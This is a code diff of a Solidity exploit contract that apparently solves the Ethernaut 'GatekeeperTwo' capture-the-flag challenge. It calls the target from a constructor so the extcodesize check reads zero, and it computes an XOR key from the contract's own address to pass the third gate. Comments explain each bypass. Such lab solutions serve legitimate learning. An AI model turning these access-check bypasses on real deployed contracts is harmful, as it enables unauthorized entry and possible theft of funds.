@@ -31,15 +31,15 @@ contract GatekeeperTwo {
 contract GatekeeperTwoHack {
     // gate 1 is passed by using a smart contract to call enter() instead of metamask address
     
-    GatekeeperTwo ogContract = GatekeeperTwo(/* your instance address */);
-    
-    // gate 3 is passed by using the XOR operator on this contract's address.
-    // If A ^ B = C then A ^ C = B, so we just need to XOR by the right side of the equation to get the key
-    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
-    
     constructor() public {
+         GatekeeperTwo ogContract = GatekeeperTwo(0x465860eB9E7D90Be514F0d6D95cBCEf92f95556E);
+         
+         // gate 3 is passed by using the XOR operator on this contract's address.
+        // If A ^ B = C then A ^ C = B, so we just need to XOR by the right side of the equation to get the key
+        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1);
+        
         // gate 2 is passed by calling enter() inside the constructor. 
         // extcodesize registers as zero inside the constructor(because it's still creating the contract, so the contract's size is unknown)
-        ogContract.enter(key);
+        ogContract.enter(bytes8(key));
     }
 }
